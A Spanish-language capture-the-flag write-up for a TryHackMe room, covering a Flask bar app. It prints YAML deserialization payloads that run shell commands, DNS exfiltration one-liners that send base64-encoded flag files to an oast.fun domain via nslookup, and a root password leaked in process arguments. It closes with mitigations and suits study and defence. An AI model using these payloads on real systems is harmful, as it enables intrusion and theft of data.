# Writeup: Beach Bar (Hacker Holidays 2026 — Day 5)

## Información
- **Plataforma:** TryHackMe
- **URL:** https://tryhackme.com/room/hh-beachbar-d849f7f7
- **Dificultad:** Easy
- **Categoría:** Boot2Root / Web
- **Técnicas principales:** source-code review, unsafe YAML deserialization, DNS exfiltration, credential leak in process arguments
- **Fecha:** 2026-08-07

## Resumen ejecutivo
Beach Bar es un boot2root de dificultad easy del evento Hacker Holidays 2026. La cadena completa es: credenciales de demo expuestas en un comentario HTML → autenticación como DJ → importador de playlists que deserializa YAML sin safe loader → ejecución de comandos como `bartender` → password de root filtrada en la línea de comandos de un proceso root (`jukeboxd.py`) → `su root` y lectura de la root flag.

## Reconocimiento

### Enumeración de puertos
```bash
nmap -sC -sV -p- -Pn --open 10.64.169.219
```
- **22/tcp** — OpenSSH
- **80/tcp** — Gunicorn (aplicación web Flask del beach bar)

### Enumeración web
- Página principal: formulario de login para el DJ booth.
- `gobuster dir -u http://10.64.169.219 -w /usr/share/wordlists/dirb/common.txt` encontró rutas como `/dashboard`, `/import`, `/export`.
- **Source-code review:** un comentario HTML revela el login de demo.

## Explotación

### 1. Login con credenciales hardcodeadas

```html
<!-- Demo DJ login: dj / dj -->
```

```bash
curl -s -X POST http://10.64.169.219/login -d "username=dj&password=dj" -c cookies.txt
```

### 2. Importador de playlists y YAML deserialization

La función **Import** acepta un archivo `.yml` y lo muestra como un objeto Python parseado, lo que indica que el backend usa `yaml.load()` o equivalente en lugar de `yaml.safe_load()`.

**Payload básico de confirmación (RCE):**

```yaml
!!python/object/apply:subprocess.check_output
- ["id"]
```

Resultado: `uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)`.

### 3. Reverse shell (fallback por restricciones de red)

El primer intento de reverse shell y callback HTTP a la VPN del atacante no funcionó, probablemente por filtros de salida en la red de la máquina. Se pivotó a **exfiltración DNS** vía `nslookup` y `oast.fun`.

**Ejemplo de payload de exfiltración DNS:**

```yaml
!!python/object/apply:os.system
- "cat /home/bartender/user.txt | base64 | tr -d '\\n' | fold -w 50 | while read c; do nslookup ${c}.<OAST_DOMAIN>.oast.fun; done"
```

**Concepto clave:** DNS permite sacar datos de una red restringida porque las resoluciones suelen salir por UDP/53 hacia servidores autoritativos externos. La data va codificada en los subdominios consultados.

## Post-explotación / Escalada de privilegios

### 1. Enumeración de procesos root

```bash
ps auxww
```

Un proceso root llamado `jukeboxd.py` tenía la password de root en su línea de comandos. Esto es un error clásico: pasar secrets como argumentos los expone a cualquier usuario local vía `ps`, `/proc/<pid>/cmdline`, o herramientas como `linPEAS`.

### 2. Cambio a root

```bash
su root
# password: SunsetSpritz2024!
```

Dado que no había shell interactiva estable, se automatizó vía YAML payload:

```yaml
!!python/object/apply:os.system
- "echo 'SunsetSpritz2024!' | su - root -c 'cat /root/root.txt' | base64 | tr -d '\\n' | fold -w 30 | xargs -I {} nslookup {}.<OAST_DOMAIN>.oast.fun"
```

**Variantes si `su` falla por TTY:**
- Usar `script -qc '...' /dev/null` para crear un pseudo-TTY.
- Usar `python3` con `pty` + `subprocess`.
- Probar `sudo -S` si la password también funciona para sudo.

## Bandera(s) / Evidencia

- **User flag:** `THM{...}` en `/home/bartender/user.txt`.
- **Root flag:** `THM{...}` en `/root/root.txt`.

> Las flags reales se omiten en este writeup público.

## Lecciones aprendidas

1. **Source-code review primero:** antes de SQLi, fuzzing pesado o fuerza bruta, revisar comentarios, scripts y fuentes de la página.
2. **Deserialización YAML es peligrosa:** usar siempre `yaml.safe_load()` / `SafeLoader` cuando el input es controlado por el usuario.
3. **Secrets en argumentos de proceso:** nunca pasar passwords, API keys o tokens en la línea de comandos. Usar variables de entorno, archivos de configuración protegidos, o secret managers.
4. **DNS exfil funciona cuando TCP/HTTP está bloqueado:** es una alternativa válida para sacar datos de redes restringidas, aunque lenta y ruidosa.

## Herramientas usadas

- `nmap`
- `gobuster`
- `curl`
- `base64`, `fold`, `nslookup`
- `ps auxww`
- `oast.fun` (DNS exfiltration)

## Errores comunes / Mitigaciones

| Error | Mitigación |
|-------|------------|
| Dejar credenciales demo en comentarios HTML | Revisar código antes de deploy; no hardcodear credenciales. |
| Usar `yaml.load()` con input de usuario | Reemplazar por `yaml.safe_load()` o `yaml.load(..., Loader=yaml.SafeLoader)`. |
| Filtrar secrets en `ps` / `/proc` | Usar variables de entorno o archivos con permisos restrictivos. |
| Permitir outbound DNS sin control | Filtrar resoluciones a dominios sospechosos; usar DNS interno logging. |

## Variantes / Próximos pasos

- Reproducir el ataque localmente con un Flask app vulnerable a YAML deserialization.
- Automatizar la exfiltración DNS con un script que reconstruya los chunks base64.
- Practicar escalada vía process argument leak en otra máquina Linux.
